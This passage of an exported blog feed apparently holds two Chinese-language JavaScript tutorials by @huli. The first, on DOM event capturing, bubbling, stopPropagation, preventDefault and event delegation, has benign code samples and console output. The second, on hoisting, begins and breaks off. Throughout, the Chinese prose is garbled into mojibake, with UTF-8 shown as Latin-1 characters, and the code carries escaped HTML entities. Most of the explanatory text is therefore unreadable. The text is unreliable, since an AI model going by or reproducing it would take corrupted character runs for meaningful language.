æœ€å¾Œï¼Œäº‹ä»¶å†å¾€ä¸Šå¾å­ç¯€é»ä¸€è·¯é€†å‘å‚³å›å»æ ¹ç¯€é»ï¼Œé€™æ™‚å€™å°±å«åšBUBBLING_PHASE ï¼Œä¹Ÿæ˜¯å¤§å®¶æ¯”è¼ƒç†ŸçŸ¥çš„å†’æ³¡éšæ®µã€‚
é€™é‚Šç”¨æ–‡å­—ä½ å¯èƒ½æœƒè¦ºå¾—éœ§ç…ç…ï¼Œæˆ‘ç›´æ¥å¼•ç”¨ä¸€å¼µ w3c è¬› event flow çš„åœ–ï¼Œç›¸ä¿¡å¤§å®¶å°±æ¸…æ¥šäº†ã€‚

ä½ åœ¨é»æ“Šé‚£ä¸€å€‹tdçš„æ™‚å€™ï¼Œé€™ä¸€å€‹é»æ“Šçš„äº‹ä»¶æœƒå…ˆå¾windowé–‹å§‹å¾€ä¸‹å‚³ï¼Œä¸€ç›´å‚³åˆ°tdç‚ºæ­¢ï¼Œåˆ°é€™é‚Šå°±å«åšCAPTURING_PHASEï¼Œæ•ç²éšæ®µã€‚
æ¥è‘—äº‹ä»¶å‚³éåˆ°tdæœ¬èº«ï¼Œé€™æ™‚å€™å«åšAT_TARGETã€‚
æœ€å¾Œäº‹ä»¶æœƒå¾tdä¸€è·¯å‚³å›å»windowï¼Œé€™æ™‚å€™å«åšBUBBLING_PHASEï¼Œå†’æ³¡éšæ®µã€‚
æ‰€ä»¥ï¼Œåœ¨çœ‹ä¸€äº›è¬›äº‹ä»¶æ©Ÿåˆ¶çš„æ–‡ç« çš„æ™‚å€™ï¼Œéƒ½æœƒçœ‹åˆ°ä¸€å€‹å£è¨£ï¼š

å…ˆæ•ç²ï¼Œå†å†’æ³¡

å°±æ˜¯é€™æ¨£ä¾†çš„ã€‚
å¯æ˜¯ï¼Œæˆ‘è¦æ€éº¼æ±ºå®šæˆ‘è¦åœ¨æ•ç²éšæ®µé‚„æ˜¯å†’æ³¡éšæ®µå»ç›£è½é€™å€‹äº‹ä»¶å‘¢ï¼Ÿ
å…¶å¯¦ï¼Œä¸€æ¨£æ˜¯ç”¨å¤§å®¶æ‰€ç†Ÿæ‚‰çš„addEventListenerï¼Œåªæ˜¯é€™å‡½æ•¸å…¶å¯¦æœ‰ç¬¬ä¸‰å€‹åƒæ•¸ï¼Œtrueä»£è¡¨æŠŠé€™å€‹ listener æ·»åŠ åˆ°æ•ç²éšæ®µï¼Œfalseæˆ–æ˜¯æ²’æœ‰å‚³å°±ä»£è¡¨æŠŠé€™å€‹ listener æ·»åŠ åˆ°å†’æ³¡éšæ®µã€‚
å¯¦éš›æ¼”ç·´å¤§æ¦‚çŸ¥é“äº‹ä»¶çš„å‚³éæ©Ÿåˆ¶ä¹‹å¾Œï¼Œæˆ‘å€‘æ‹¿ä¸Šé¢å¯«å¥½çš„é‚£ä¸€å€‹ç°¡å–®ç¯„ä¾‹ä¾†ç¤ºç¯„ä¸€ä¸‹ï¼Œä¸€æ¨£å…ˆé™„ä¸Šäº‹ä»¶å‚³éçš„æµç¨‹åœ–ï¼ˆå‡è¨­æˆ‘å€‘é»æ“Šçš„å°è±¡æ˜¯#list_item_linkï¼‰

æ¥è‘—ï¼Œä¾†è©¦è©¦çœ‹å¹«æ¯ä¸€å€‹å…ƒç´ çš„æ¯ä¸€å€‹éšæ®µéƒ½æ·»åŠ äº‹ä»¶ï¼Œçœ‹ä¸€çœ‹çµæœè·Ÿæƒ³åƒä¸­çš„æ˜¯å¦ä¸€æ¨£ï¼š
const get = (id) =&gt; document.getElementById(id);const $list = get(&#x27;list&#x27;);const $list_item = get(&#x27;list_item&#x27;);const $list_item_link = get(&#x27;list_item_link&#x27;);  // list çš„æ•ç²$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing&#x27;, e.eventPhase);&#125;, true)  // list çš„å†’æ³¡$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list bubbling&#x27;, e.eventPhase);&#125;, false)  // list_item çš„æ•ç²$list_item.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list_item capturing&#x27;, e.eventPhase);&#125;, true)  // list_item çš„å†’æ³¡$list_item.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list_item bubbling&#x27;, e.eventPhase);&#125;, false)  // list_item_link çš„æ•ç²$list_item_link.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list_item_link capturing&#x27;, e.eventPhase);&#125;, true)  // list_item_link çš„å†’æ³¡$list_item_link.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list_item_link bubbling&#x27;, e.eventPhase);&#125;, false)

é»ä¸€ä¸‹è¶…é€£çµï¼Œconsole è¼¸å‡ºä»¥ä¸‹çµæœï¼š
list capturing1list_item capturing1list_item_link capturing2list_item_link bubbling2list_item bubbling3list bubbling3

1 æ˜¯CAPTURING_PHASEï¼Œ2 æ˜¯AT_TARGETï¼Œ3 æ˜¯BUBBLING_PHASEã€‚
å¾é€™é‚Šå°±å¯ä»¥å¾ˆæ˜é¡¯çœ‹å‡ºï¼Œäº‹ä»¶çš„ç¢ºæ˜¯å¾æœ€ä¸Šå±¤ä¸€ç›´å‚³éåˆ° targetï¼Œè€Œåœ¨é€™å‚³éçš„éç¨‹è£¡ï¼Œæˆ‘å€‘ç”¨addEventListenrçš„ç¬¬ä¸‰å€‹åƒæ•¸æŠŠ listener æ·»åŠ åœ¨CAPTURING_PHASEã€‚
ç„¶å¾Œäº‹ä»¶å‚³éåˆ°æˆ‘å€‘é»æ“Šçš„è¶…é€£çµï¼ˆa#list_item_linkï¼‰æœ¬èº«ï¼Œåœ¨é€™é‚Šç„¡è«–ä½ ä½¿ç”¨addEventListenerçš„ç¬¬ä¸‰å€‹åƒæ•¸æ˜¯trueé‚„æ˜¯falseï¼Œé€™é‚Šçš„e.eventPhaseéƒ½æœƒè®ŠæˆAT_TARGETã€‚
æœ€å¾Œï¼Œå†å¾ target ä¸æ–·å†’æ³¡å‚³å›å»ï¼Œå…ˆå‚³åˆ°ä¸Šä¸€å±¤çš„#list_itemï¼Œå†å‚³åˆ°ä¸Šä¸Šå±¤çš„#listã€‚
å…ˆæ•ç²ï¼Œå†å†’æ³¡çš„å°é™·é˜±æ—¢ç„¶æ˜¯å…ˆæ•ç²ï¼Œå†å†’æ³¡ï¼Œæ„æ€å°±æ˜¯ç„¡è«–é‚£äº›addEventListenerçš„é †åºæ€éº¼è®Šï¼Œè¼¸å‡ºçš„æ±è¥¿æ‡‰è©²é‚„æ˜¯æœƒä¸€æ¨£æ‰å°ã€‚æˆ‘å€‘æŠŠæ•ç²è·Ÿå†’æ³¡çš„é †åºå°èª¿ï¼Œçœ‹ä¸€ä¸‹è¼¸å‡ºçµæœæ˜¯å¦ä¸€æ¨£ã€‚
const get = (id) =&gt; document.getElementById(id);const $list = get(&#x27;list&#x27;);const $list_item = get(&#x27;list_item&#x27;);const $list_item_link = get(&#x27;list_item_link&#x27;);  // list çš„å†’æ³¡$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list bubbling&#x27;, e.eventPhase);&#125;, false)  // list çš„æ•ç²$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing&#x27;, e.eventPhase);&#125;, true)  // list_item çš„å†’æ³¡$list_item.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list_item bubbling&#x27;, e.eventPhase);&#125;, false)  // list_item çš„æ•ç²$list_item.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list_item capturing&#x27;, e.eventPhase);&#125;, true)  // list_item_link çš„å†’æ³¡$list_item_link.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list_item_link bubbling&#x27;, e.eventPhase);&#125;, false)  // list_item_link çš„æ•ç²$list_item_link.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list_item_link capturing&#x27;, e.eventPhase);&#125;, true)

ä¸€æ¨£é»æ“Šè¶…é€£çµï¼Œè¼¸å‡ºçš„çµæœæ˜¯ï¼š
list capturing1list_item capturing1list_item_link bubbling2list_item_link capturing2list_item bubbling3list bubbling3

å¯ä»¥ç™¼ç¾ä¸€ä»¶ç¥å¥‡çš„äº‹ï¼Œé‚£å°±æ˜¯list_item_linkå±…ç„¶æ˜¯å…ˆåŸ·è¡Œäº†æ·»åŠ åœ¨å†’æ³¡éšæ®µçš„ listenerï¼Œæ‰åŸ·è¡Œæ•ç²éšæ®µçš„ listenerã€‚
é€™æ˜¯ç‚ºä»€éº¼å‘¢ï¼Ÿ
å…¶å¯¦å‰›å‰›ä¸Šé¢æœ‰æåˆ°ï¼Œç•¶äº‹ä»¶å‚³éåˆ°é»æ“Šçš„çœŸæ­£å°è±¡ï¼Œä¹Ÿå°±æ˜¯ e.target çš„æ™‚å€™ï¼Œç„¡è«–ä½ ä½¿ç”¨addEventListenerçš„ç¬¬ä¸‰å€‹åƒæ•¸æ˜¯trueé‚„æ˜¯falseï¼Œé€™é‚Šçš„e.eventPhaseéƒ½æœƒè®ŠæˆAT_TARGETã€‚
æ—¢ç„¶é€™é‚Šå·²ç¶“è®ŠæˆAT_TARGETï¼Œè‡ªç„¶å°±æ²’æœ‰ä»€éº¼æ•ç²è·Ÿå†’æ³¡ä¹‹åˆ†ï¼Œæ‰€ä»¥åŸ·è¡Œé †åºå°±æœƒæ ¹æ“šä½ addEventListenerçš„é †åºè€Œå®šï¼Œå…ˆæ·»åŠ çš„å…ˆåŸ·è¡Œï¼Œå¾Œæ·»åŠ çš„å¾ŒåŸ·è¡Œã€‚
æ‰€ä»¥ï¼Œé€™å°±æ˜¯ç‚ºä»€éº¼æˆ‘å€‘ä¸Šé¢æŠŠæ•ç²è·Ÿå†’æ³¡çš„é †åºæ›äº†ä»¥å¾Œï¼Œæœƒå…ˆå‡ºç¾list_item_link bubblingçš„åŸå› ã€‚
é—œæ–¼é€™äº›äº‹ä»¶çš„å‚³éé †åºï¼Œåªè¦è¨˜ä½å…©å€‹åŸå‰‡å°±å¥½ï¼š

å…ˆæ•ç²ï¼Œå†å†’æ³¡
ç•¶äº‹ä»¶å‚³åˆ° target æœ¬èº«ï¼Œæ²’æœ‰åˆ†æ•ç²è·Ÿå†’æ³¡

jsbin ç¯„ä¾‹ç¨‹å¼ç¢¼
å–æ¶ˆäº‹ä»¶å‚³éæ¥è‘—è¦è¬›çš„æ˜¯ï¼Œé€™ä¸€ä¸²äº‹ä»¶éˆé€™éº¼é•·ï¼Œä¸€å®šæœ‰æ–¹æ³•å¯ä»¥ä¸­æ–·é€™ä¸€æ¢éˆï¼Œè®“äº‹ä»¶çš„å‚³éä¸å†ç¹¼çºŒã€‚è€Œé€™å€‹æ–¹æ³•ç›¸ä¿¡å¤§å®¶æ‡‰è©²éƒ½ä¸é™Œç”Ÿï¼Œå°±æ˜¯ï¼še.stopPropagationã€‚
ä½ åŠ åœ¨å“ªé‚Šï¼Œäº‹ä»¶çš„å‚³éå°±æ–·åœ¨å“ªè£¡ï¼Œä¸æœƒç¹¼çºŒå¾€ä¸‹å‚³éã€‚
ä¾‹å¦‚èªªä»¥ä¸Šé¢é‚£å€‹ä¾‹å­ä¾†è¬›ï¼Œå‡å¦‚æˆ‘åŠ åœ¨#listçš„æ•ç²éšæ®µï¼š
// list çš„æ•ç²$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing&#x27;, e.eventPhase);  e.stopPropagation();&#125;, true)

é€™æ¨£å­ï¼Œconsole å°±åªæœƒè¼¸å‡ºï¼š
list capturing1

å› ç‚ºäº‹ä»¶çš„å‚³éè¢«åœæ­¢ï¼Œæ‰€ä»¥å‰©ä¸‹çš„ listener éƒ½ä¸æœƒå†æ”¶åˆ°ä»»ä½•äº‹ä»¶ã€‚
ä¸éï¼Œåœ¨é€™é‚Šä¾ç„¶æœ‰ä¸€å€‹åœ°æ–¹è¦ç‰¹åˆ¥æ³¨æ„ã€‚
é€™é‚ŠæŒ‡çš„ã€Œäº‹ä»¶å‚³éè¢«åœæ­¢ã€ï¼Œæ„æ€æ˜¯èªªä¸æœƒå†æŠŠäº‹ä»¶å‚³éçµ¦ã€Œä¸‹ä¸€å€‹ç¯€é»ã€ï¼Œä½†è‹¥æ˜¯ä½ åœ¨åŒä¸€å€‹ç¯€é»ä¸Šæœ‰ä¸åªä¸€å€‹ listenerï¼Œé‚„æ˜¯æœƒè¢«åŸ·è¡Œåˆ°ã€‚
ä¾‹å¦‚èªªï¼š
// list çš„æ•ç²$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing&#x27;);  e.stopPropagation();&#125;, true)  // list çš„æ•ç² 2$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing2&#x27;);&#125;, true)

è¼¸å‡ºçµæœæ˜¯ï¼š
list capturinglist capturing2

å„˜ç®¡å·²ç¶“ç”¨e.stopPropagationï¼Œä½†å°æ–¼åŒä¸€å€‹å±¤ç´šï¼Œå‰©ä¸‹çš„ listener é‚„æ˜¯æœƒè¢«åŸ·è¡Œåˆ°ã€‚
è‹¥æ˜¯ä½ æƒ³è¦è®“å…¶ä»–åŒä¸€å±¤ç´šçš„ listener ä¹Ÿä¸è¦è¢«åŸ·è¡Œï¼Œå¯ä»¥æ”¹ç”¨e.stopImmediatePropagation();
ä¾‹å¦‚èªªï¼š
// list çš„æ•ç²$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing&#x27;);  e.stopImmediatePropagation();&#125;, true)  // list çš„æ•ç² 2$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing2&#x27;);&#125;, true)

è¼¸å‡ºçµæœæ˜¯ï¼š
list capturing

å–æ¶ˆé è¨­è¡Œç‚ºå¸¸å¸¸æœ‰äººæä¸æ¸…æ¥še.stopPropagationè·Ÿe.preventDefaultçš„å·®åˆ¥ï¼Œå‰è€…æˆ‘å€‘å‰›å‰›å·²ç¶“èªªæ˜äº†ï¼Œå°±æ˜¯å–æ¶ˆäº‹ä»¶ç¹¼çºŒå¾€ä¸‹å‚³éï¼Œè€Œå¾Œè€…å‰‡æ˜¯å–æ¶ˆç€è¦½å™¨çš„é è¨­è¡Œç‚ºã€‚
æœ€å¸¸è¦‹çš„åšæ³•å°±æ˜¯é˜»æ­¢è¶…é€£çµï¼Œä¾‹å¦‚èªªï¼š
// list_item_link çš„å†’æ³¡$list_item_link.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  e.preventDefault();&#125;, false)

é€™æ¨£å­ï¼Œç•¶é»æ“Šè¶…é€£çµçš„æ™‚å€™ï¼Œå°±ä¸æœƒåŸ·è¡ŒåŸæœ¬é è¨­çš„è¡Œç‚ºï¼ˆæ–°é–‹åˆ†é æˆ–æ˜¯è·³è½‰ï¼‰ï¼Œè€Œæ˜¯æ²’æœ‰ä»»ä½•äº‹æƒ…ç™¼ç”Ÿï¼Œé€™å°±æ˜¯preventDefaultçš„ä½œç”¨ã€‚
æ‰€ä»¥å‘¢ï¼ŒpreventDefaultè·Ÿ JavaScript çš„äº‹ä»¶å‚³éã€Œä¸€é»é—œä¿‚éƒ½æ²’æœ‰ã€ï¼Œä½ åŠ ä¸Šé€™ä¸€è¡Œä¹‹å¾Œï¼Œäº‹ä»¶é‚„æ˜¯æœƒç¹¼çºŒå¾€ä¸‹å‚³éã€‚
æœ‰ä¸€å€‹ç‰¹åˆ¥å€¼å¾—æ³¨æ„çš„åœ°æ–¹æ˜¯ W3C çš„æ–‡ä»¶è£¡é¢æœ‰å¯«åˆ°ï¼š

Once preventDefault has been called it will remain in effect throughout the remainder of the eventâ€™s propagation.

æ„æ€å°±æ˜¯èªªä¸€æ—¦ call äº†preventDefault ï¼Œåœ¨ä¹‹å¾Œå‚³éä¸‹å»çš„äº‹ä»¶è£¡é¢ä¹Ÿæœƒæœ‰æ•ˆæœã€‚
æˆ‘å€‘ä¾†çœ‹ä¸€å€‹ç¯„ä¾‹ï¼š
// list çš„æ•ç²$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing&#x27;, e.eventPhase);  e.preventDefault();&#125;, true)

æˆ‘å€‘åœ¨#listçš„æ•ç²äº‹ä»¶è£¡é¢å°±å…ˆå¯«äº†e.preventDefault()ï¼Œè€Œæ ¹æ“šæ–‡ä»¶ä¸Šé¢æ‰€èªªçš„ï¼Œé€™å€‹æ•ˆæœæœƒåœ¨ä¹‹å¾Œå‚³éçš„äº‹ä»¶è£¡é¢ä¸€ç›´å»¶çºŒã€‚
å› æ­¤ï¼Œç­‰ä¹‹å¾Œäº‹ä»¶å‚³éåˆ°#list_item_linkçš„æ™‚å€™ï¼Œä½ æœƒç™¼ç¾é»è¶…é€£çµä¸€æ¨£æ²’åæ‡‰ã€‚
å¯¦éš›æ‡‰ç”¨çŸ¥é“äº†äº‹ä»¶çš„å‚³éæ©Ÿåˆ¶ã€å–æ¶ˆå‚³éäº‹ä»¶è·Ÿå–æ¶ˆé è¨­è¡Œç‚ºä¹‹å¾Œï¼Œåœ¨å¯¦éš›é–‹ç™¼ä¸Šæœ‰ä»€éº¼ç”¨è™•å‘¢ï¼Ÿ
æœ€å¸¸è¦‹çš„ç”¨æ³•å…¶å¯¦å°±æ˜¯äº‹ä»¶ä»£ç†ï¼ˆDelegationï¼‰ï¼Œä¾‹å¦‚èªªä½ ä»Šå¤©æœ‰ä¸€å€‹ ulï¼Œåº•ä¸‹ 1000 å€‹ liï¼Œå¦‚æœä½ å¹«æ¯ä¸€å€‹ li éƒ½åŠ ä¸Šä¸€å€‹ eventListenerï¼Œä½ å°±æ–°å»ºäº† 1000  å€‹ functionã€‚
ä½†æˆ‘å€‘å‰›å‰›å·²ç¶“çŸ¥é“ï¼Œä»»ä½•é»æ“Š li çš„äº‹ä»¶å…¶å¯¦éƒ½æœƒå‚³åˆ° ul èº«ä¸Šï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥åœ¨ ul èº«ä¸Šæ›ä¸€å€‹ listener å°±å¥½ã€‚
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;  &lt;ul id=&quot;list&quot;&gt;    &lt;li data-index=&quot;1&quot;&gt;1&lt;/li&gt;    &lt;li data-index=&quot;2&quot;&gt;2&lt;/li&gt;    &lt;li data-index=&quot;3&quot;&gt;3&lt;/li&gt;  &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;

document.getElementById(&#x27;list&#x27;).addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(e.target.getAttribute(&#x27;data-index&#x27;));&#125;)

è€Œé€™æ¨£çš„å¥½è™•æ˜¯ç•¶ä½ æ–°å¢æˆ–æ˜¯åˆªé™¤ä¸€å€‹ li çš„æ™‚å€™ï¼Œä¸ç”¨å»è™•ç†è·Ÿé‚£å€‹å…ƒç´ ç›¸é—œçš„ listenerï¼Œå› ç‚ºä½ çš„ listener æ˜¯æ”¾åœ¨ ul èº«ä¸Šã€‚é€™æ¨£é€éçˆ¶ç¯€é»ä¾†è™•ç†å­ç¯€é»çš„äº‹ä»¶ï¼Œå°±å«åšäº‹ä»¶ä»£ç†ã€‚
é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘æœ‰æƒ³åˆ°å¹¾å€‹æ»¿æœ‰è¶£çš„æ‡‰ç”¨ï¼Œå¤§å®¶å¯ä»¥åƒè€ƒçœ‹çœ‹ã€‚
ä¾‹å¦‚èªªå‰›å‰›æåˆ°çš„e.preventDefault()ï¼Œæ—¢ç„¶æˆ‘å€‘çŸ¥é“åŸç†è·Ÿä½¿ç”¨æŠ€å·§ï¼Œå°±å¯ä»¥é€™æ¨£ç”¨ï¼š
window.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  e.preventDefault();  e.stopPropagation();&#125;, true);

åªè¦é€™æ¨£ä¸€æ®µç¨‹å¼ç¢¼ï¼Œå°±å¯ä»¥æŠŠé é¢ä¸Šæ‰€æœ‰çš„å…ƒç´ åœç”¨ï¼Œé»äº†éƒ½æ²’æœ‰åæ‡‰ï¼Œåƒæ˜¯&lt;a&gt;é»äº†ä¸æœƒè·³å‡ºè¶…é€£çµï¼Œ&lt;form&gt;æŒ‰äº†submitä¹Ÿæ²’ç”¨ï¼Œè€Œä¸”å› ç‚ºé˜»æ­¢äº‹ä»¶å†’æ³¡ï¼Œæ‰€ä»¥å…¶ä»–çš„onClickäº‹ä»¶ä¹Ÿéƒ½ä¸æœƒåŸ·è¡Œã€‚
æˆ–æ˜¯ï¼Œä¹Ÿå¯ä»¥é€™æ¨£ç”¨ï¼š
window.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(e.target);&#125;, true)

åˆ©ç”¨äº‹ä»¶å‚³éæ©Ÿåˆ¶çš„ç‰¹æ€§ï¼Œåœ¨windowä¸Šé¢ä½¿ç”¨æ•ç²ï¼Œå°±èƒ½ä¿è­‰ä¸€å®šæ˜¯ç¬¬ä¸€å€‹è¢«åŸ·è¡Œçš„äº‹ä»¶ï¼Œä½ å°±å¯ä»¥åœ¨é€™å€‹ function è£¡é¢åµæ¸¬é é¢ä¸­æ¯ä¸€å€‹å…ƒç´ çš„é»æ“Šï¼Œå¯ä»¥å‚³å›å»åšæ•¸æ“šçµ±è¨ˆåŠåˆ†æã€‚
çµè«–DOM çš„äº‹ä»¶å‚³éæ©Ÿåˆ¶ç®—æ˜¯ JavaScript çœ¾å¤šç¶“å…¸é¢è©¦é¡Œè£¡é¢ç›¸å°ç°¡å–®å¾ˆå¤šçš„ï¼Œåªè¦èƒ½æŒæ¡äº‹ä»¶å‚³éçš„åŸå‰‡è·Ÿé †åºï¼Œå…¶å¯¦å°±å·®ä¸å¤šäº†ã€‚
è€Œe.preventDefaultèˆ‡e.stopPropagationçš„å·®åˆ¥åœ¨çŸ¥é“äº‹ä»¶å‚³éé †åºä¹‹å¾Œä¹Ÿå¤§æ¦‚èƒ½ç†è§£ï¼Œå‰è€…å°±åªæ˜¯å–æ¶ˆé è¨­è¡Œç‚ºï¼Œè·Ÿäº‹ä»¶å‚³éæ²’æœ‰ä»»ä½•é—œä¿‚ï¼Œå¾Œè€…å‰‡æ˜¯è®“äº‹ä»¶ä¸å†å¾€ä¸‹å‚³éã€‚
å¸Œæœ›é€™ç¯‡èƒ½è®“å¤§å®¶ç†è§£ DOM çš„äº‹ä»¶å‚³éæ©Ÿåˆ¶ï¼Œå¦‚æœæœ‰å“ªé‚Šæœ‰è¬›éŒ¯ï¼Œä¹Ÿéº»ç…©å¤§å®¶ä¸åæŒ‡è­‰ï¼Œæ„Ÿè¬ã€‚
åƒè€ƒè³‡æ–™ï¼ˆæ¯”è¼ƒæ¨è–¦å¾Œé¢é‚£äº›åŸæ–‡è³‡æ–™ï¼‰ï¼š

JavaScript è¯¦è¯´äº‹ä»¶æœºåˆ¶ä¹‹å†’æ³¡ã€æ•è·ã€ä¼ æ’­ã€å§”æ‰˜
Javascript äº‹ä»¶å†’æ³¡å’Œæ•è·çš„ä¸€äº›æ¢è®¨
æµ…è°ˆ javascript äº‹ä»¶å–æ¶ˆå’Œé˜»æ­¢å†’æ³¡
What Is Event Bubbling in JavaScript? Event Propagation Explained
What is event bubbling and capturing?
Event order
Document Object Model Events

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>DOM</tag>
        <tag>event</tag>
        <tag>bubble</tag>
        <tag>capture</tag>
        <tag>propagation</tag>
      </tags>
  </entry>
  <entry>
    <title>æˆ‘çŸ¥é“ä½ æ‡‚ hoistingï¼Œå¯æ˜¯ä½ äº†è§£åˆ°å¤šæ·±ï¼Ÿ</title>
    <url>/2018/11/10/javascript-hoisting/</url>
    <content><![CDATA[å‰è¨€é€™é™£å­æˆ‘åœ¨å¿™ä¸€äº›æ•™å­¸ç›¸é—œçš„æ±è¥¿ï¼Œç¨å¾®æº–å‚™ä¸€äº›è³‡æ–™ä¹‹å¾Œæ•™äº†å­¸ç”Ÿå€‘ JavaScript è£¡é¢çš„ hoistingï¼Œä¹Ÿå°±æ˜¯ã€Œæå‡ã€é€™å€‹è§€å¿µï¼Œä¾‹å¦‚èªªä»¥ä¸‹ç¨‹å¼ç¢¼ï¼š
console.log(a)var a = 10

æœƒè¼¸å‡ºundefinedè€Œä¸æ˜¯ReferenceError: a is not definedï¼Œé€™ç¨®ç¾è±¡å°±å«åš Hoistingï¼Œè®Šæ•¸çš„å®£å‘Šè¢«ã€Œæå‡ã€åˆ°æœ€ä¸Šé¢å»äº†ã€‚
å¦‚æœä½ åªæƒ³äº†è§£æœ€åŸºæœ¬çš„ hoistingï¼Œå…¶å¯¦å·®ä¸å¤šå°±æ˜¯é€™æ¨£ï¼Œä½†å¾Œä¾†æˆ‘é‚„æ•™äº†letè·Ÿconstç›¸é—œçš„ä¸€äº›çŸ¥è­˜ï¼Œä¸éå‰ä¸€å¤©å‰›æ•™å­¸å®Œï¼Œéš”å¤©å°±ç«‹åˆ»çœ‹åˆ°ç›¸é—œçš„æŠ€è¡“æ–‡ç« é‚„ç™¼ç¾è‡ªå·±æ•™éŒ¯ï¼Œå› æ­¤ç‰¹åˆ¥èŠ±äº†ä¸€é»æ™‚é–“æ‰“ç®—å¥½å¥½ç†è§£ hoisting é€™å€‹æ±è¥¿ã€‚
å¾ˆå¤šæ±è¥¿æ²’æœ‰æ·±å…¥ç ”ç©¶çš„æ™‚å€™ä½ éƒ½æœƒè¦ºå¾—æ²’ä»€éº¼ï¼ŒçœŸçš„è·³ä¸‹å»æ·±å…¥å»çœ‹æ‰æœƒç™¼ç¾è‡ªå·±å…¶å¯¦é‚„æœ‰ä¸€å¤§å †æ¦‚å¿µæ²’æœ‰ææ‡‚ã€‚
æœ‰å¾ˆå¤šäººéƒ½çŸ¥é“ hoistingï¼Œä½†æ˜¯ç†è§£ç¨‹åº¦å»ä¸ç›¡ç›¸åŒï¼Œæˆ‘åˆ—å‡ºäº† 10 å€‹é …ç›®ï¼Œå¦‚æœæœ‰ä»»ä½•ä¸€é»ä½ å‰›å¥½ä¸çŸ¥é“çš„è©±ï¼Œé‚£æ­å–œï¼Œé€™ç¯‡æ–‡ç« æ‡‰è©²å¯ä»¥ç‚ºä½ å¸¶ä¾†ä¸€äº›æ”¶ç©«ã€‚

ä½ çŸ¥é“ä»€éº¼æ˜¯ hoisting
ä½ çŸ¥é“ hoisting åªæœƒæå‡å®£å‘Šè€Œéè³¦å€¼
ä½ çŸ¥é“ function å®£å‘Šã€function çš„åƒæ•¸ä»¥åŠä¸€èˆ¬è®Šæ•¸å®£å‘ŠåŒæ™‚å‡ºç¾æ™‚çš„æå‡å„ªå…ˆé †åº
ä½ çŸ¥é“ let è·Ÿ const æ²’æœ‰ hoisting
ä½ çŸ¥é“ç¬¬å››é»æ˜¯éŒ¯çš„ï¼Œå…¶å¯¦æœ‰ä½†åªæ˜¯è¡¨ç¾å½¢å¼ä¸ä¸€æ¨£
ä½ çŸ¥é“æœ‰é—œç¬¬äº”é»ï¼Œæœ‰å€‹æ¦‚å¿µå«åš TDZï¼ˆTemporal Dead Zoneï¼‰
ä½ çœ‹é ES3 çš„è¦æ ¼æ›¸ï¼ŒçŸ¥é“è£¡é¢æ˜¯æ€éº¼æè¿°çš„
ä½ çœ‹é ES6 çš„è¦æ ¼æ›¸ï¼ŒçŸ¥é“è£¡é¢æ˜¯æ€éº¼æè¿°çš„
ä½ çŸ¥é“ hoisting èƒŒå¾Œçš„åŸç†æ˜¯ä»€éº¼
ä½ çœ‹é V8 ç·¨è­¯å‡ºä¾†çš„ç¨‹å¼ç¢¼

ä½ å¯èƒ½æœƒå•èªªï¼šã€Œæˆ‘ç‚ºä»€éº¼è¦çŸ¥é“çš„é€™éº¼æ·±ï¼Ÿæœ‰ä»€éº¼ç”¨ï¼Ÿã€ï¼Œå…¶å¯¦æˆ‘ä¹Ÿè¦ºå¾—å° hoistingï¼Œåªè¦çŸ¥é“åŸºæœ¬çš„å°±è¡Œäº†ã€‚åªè¦ä½ æœ‰å¥½å¥½åœ°å®£å‘Šè®Šæ•¸ï¼Œå°±ç®—ä¸çŸ¥é“é‚£äº›ï¼Œå°æ—¥å¸¸ç”Ÿæ´»æˆ–æ˜¯å·¥ä½œä¹Ÿä¸æœƒæœ‰å¤ªå¤§çš„å½±éŸ¿ã€‚
